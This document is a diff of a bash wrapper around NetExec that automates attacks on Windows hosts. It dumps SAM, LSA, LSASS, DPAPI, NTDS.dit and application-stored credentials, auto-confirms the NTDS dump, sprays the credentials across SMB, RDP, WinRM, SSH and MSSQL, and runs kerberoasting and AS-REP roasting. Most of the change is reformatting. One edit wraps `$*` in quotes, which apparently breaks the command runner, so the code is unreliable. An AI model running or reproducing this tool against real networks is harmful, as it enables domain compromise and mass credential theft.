@@ -26,8 +26,10 @@ usage() {
 }
 
 # ───────── Parse Arguments ──────────
-MODE="$1"; shift
-TARGET="$1"; shift
+MODE="$1"
+shift
+TARGET="$1"
+shift
 
 LOCAL_AUTH=0
 AESKEY=""
@@ -36,22 +38,43 @@ KDCHOST=""
 # Pre-scan args for long options
 for arg in "$@"; do
   case "$arg" in
-    --local-auth) LOCAL_AUTH=1; set -- "${@/--local-auth/}" ;;
-    --aesKey) AESKEY_SET=1 ;;
-    --kdcHost) KDCHOST_SET=1 ;;
+  --local-auth)
+    LOCAL_AUTH=1
+    set -- "${@/--local-auth/}"
+    ;;
+  --aesKey) AESKEY_SET=1 ;;
+  --kdcHost) KDCHOST_SET=1 ;;
   esac
 done
 
 while [[ $# -gt 0 ]]; do
   case "$1" in
-    -u) USER="$2"; shift 2 ;;
-    -p) PASS="$2"; shift 2 ;;
-    -H) HASH="$2"; shift 2 ;;
-    --aesKey) AESKEY="$2"; shift 2 ;;
-    --kdcHost) KDCHOST="$2"; shift 2 ;;
-    -o) OUTDIR="$2"; shift 2 ;;
-    -h) usage ;;
-    *) shift ;;
+  -u)
+    USER="$2"
+    shift 2
+    ;;
+  -p)
+    PASS="$2"
+    shift 2
+    ;;
+  -H)
+    HASH="$2"
+    shift 2
+    ;;
+  --aesKey)
+    AESKEY="$2"
+    shift 2
+    ;;
+  --kdcHost)
+    KDCHOST="$2"
+    shift 2
+    ;;
+  -o)
+    OUTDIR="$2"
+    shift 2
+    ;;
+  -h) usage ;;
+  *) shift ;;
   esac
 done
 
@@ -97,9 +120,9 @@ log() {
   echo -e "${BLUE}[+]${NC} $1"
 }
 
-run_nxc () {
+run_nxc() {
   log "Running: $*"
-  unbuffer $* | tee -a "$LOGFILE"
+  unbuffer "$*" | tee -a "$LOGFILE"
 }
 
 # build base auth flags
@@ -119,53 +142,53 @@ fi
 
 # ───────── Mode Logic ──────────
 case "$MODE" in
-  creds)
-    log "Starting credential collection…"
-    run_nxc nxc smb "$TARGET" $AUTH_ARGS --sam
-    run_nxc nxc smb "$TARGET" $AUTH_ARGS -M lsassy
-    run_nxc nxc smb "$TARGET" $AUTH_ARGS --lsa
-    run_nxc nxc smb "$TARGET" $AUTH_ARGS --dpapi
-    run_nxc nxc smb "$TARGET" $AUTH_ARGS -M wifi
-    run_nxc nxc smb "$TARGET" $AUTH_ARGS -M winscp
-    run_nxc nxc smb "$TARGET" $AUTH_ARGS -M rdcman
-    run_nxc nxc smb "$TARGET" $AUTH_ARGS --sccm
+creds)
+  log "Starting credential collection…"
+  run_nxc nxc smb "$TARGET" $AUTH_ARGS --sam
+  run_nxc nxc smb "$TARGET" $AUTH_ARGS -M lsassy
+  run_nxc nxc smb "$TARGET" $AUTH_ARGS --lsa
+  run_nxc nxc smb "$TARGET" $AUTH_ARGS --dpapi
+  run_nxc nxc smb "$TARGET" $AUTH_ARGS -M wifi
+  run_nxc nxc smb "$TARGET" $AUTH_ARGS -M winscp
+  run_nxc nxc smb "$TARGET" $AUTH_ARGS -M rdcman
+  run_nxc nxc smb "$TARGET" $AUTH_ARGS --sccm
 
-    # Not including PS-history in logfile not to ruin the creds file
-    log "Running: nxc smb $TARGET $AUTH_ARGS -M powershell_history"
-    unbuffer nxc smb $TARGET $AUTH_ARGS -M powershell_history
+  # Not including PS-history in logfile not to ruin the creds file
+  log "Running: nxc smb $TARGET $AUTH_ARGS -M powershell_history"
+  unbuffer nxc smb $TARGET $AUTH_ARGS -M powershell_history
 
-    log "Running: nxc smb $TARGET $AUTH_ARGS --ntds"
-    script -efqa "$LOGFILE" -c "printf 'Y\n' | nxc smb $TARGET $AUTH_ARGS --ntds"
+  log "Running: nxc smb $TARGET $AUTH_ARGS --ntds"
+  script -efqa "$LOGFILE" -c "printf 'Y\n' | nxc smb $TARGET $AUTH_ARGS --ntds"
 
-    log "Extracting potential credential lines…"
-    CREDFILE="$OUTDIR"/"${TARGET}_${MODE}.creds"
-    awk '{for (i=5; i<=NF; i++) printf $i (i<NF ? OFS : ORS)}' $LOGFILE \
-      | rg -a '^\x1b\[1;33m|^Node' \
-      | sed -r 's/\x1b\[[0-9;]*m//g' \
-      | sort -u > $CREDFILE
+  log "Extracting potential credential lines…"
+  CREDFILE="$OUTDIR"/"${TARGET}_${MODE}.creds"
+  awk '{for (i=5; i<=NF; i++) printf $i (i<NF ? OFS : ORS)}' $LOGFILE |
+    rg -a '^\x1b\[1;33m|^Node' |
+    sed -r 's/\x1b\[[0-9;]*m//g' |
+    sort -u >$CREDFILE
 
-    echo -e "${GREEN}[✓] Raw output:           ${LOGFILE}"
-    echo -e "${GREEN}[✓] Unique credentials:   ${CREDFILE}"
-    ;;
+  echo -e "${GREEN}[✓] Raw output:           ${LOGFILE}"
+  echo -e "${GREEN}[✓] Unique credentials:   ${CREDFILE}"
+  ;;
 
-  verify)
-    log "Starting service verification…"
-    run_nxc nxc smb "$TARGET" $AUTH_ARGS --shares
-    # run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS
-    run_nxc nxc rdp "$TARGET" $BASE_AUTH_ARGS
-    run_nxc nxc winrm "$TARGET" $BASE_AUTH_ARGS
-    run_nxc nxc ssh "$TARGET" $BASE_AUTH_ARGS
-    run_nxc nxc mssql "$TARGET" $BASE_AUTH_ARGS
+verify)
+  log "Starting service verification…"
+  run_nxc nxc smb "$TARGET" $AUTH_ARGS --shares
+  # run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS
+  run_nxc nxc rdp "$TARGET" $BASE_AUTH_ARGS
+  run_nxc nxc winrm "$TARGET" $BASE_AUTH_ARGS
+  run_nxc nxc ssh "$TARGET" $BASE_AUTH_ARGS
+  run_nxc nxc mssql "$TARGET" $BASE_AUTH_ARGS
 
-    sed 's/\r/\n/g' "$LOGFILE" | rg -v Running > "$LOGFILE.tmp" && mv "$LOGFILE.tmp" "$LOGFILE"
-    echo -e "${GREEN}[✓] Logfile output:       ${LOGFILE}"
-    ;;
+  sed 's/\r/\n/g' "$LOGFILE" | rg -v Running >"$LOGFILE.tmp" && mv "$LOGFILE.tmp" "$LOGFILE"
+  echo -e "${GREEN}[✓] Logfile output:       ${LOGFILE}"
+  ;;
 
-  roast)
-    log "Starting kerberoast & asreproast…"
-    run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --kerberoasting "$OUTDIR/kerberoast.hash"
-    run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --asreproast "$OUTDIR/asrep.hash"
-    echo -e "${GREEN}[✓] Kerberoast hashes:    $OUTDIR/kerberoast.hash"
-    echo -e "${GREEN}[✓] ASREProast hashes:    $OUTDIR/asrep.hash"
-    ;;
+roast)
+  log "Starting kerberoast & asreproast…"
+  run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --kerberoasting "$OUTDIR/kerberoast.hash"
+  run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --asreproast "$OUTDIR/asrep.hash"
+  echo -e "${GREEN}[✓] Kerberoast hashes:    $OUTDIR/kerberoast.hash"
+  echo -e "${GREEN}[✓] ASREProast hashes:    $OUTDIR/asrep.hash"
+  ;;
 esac
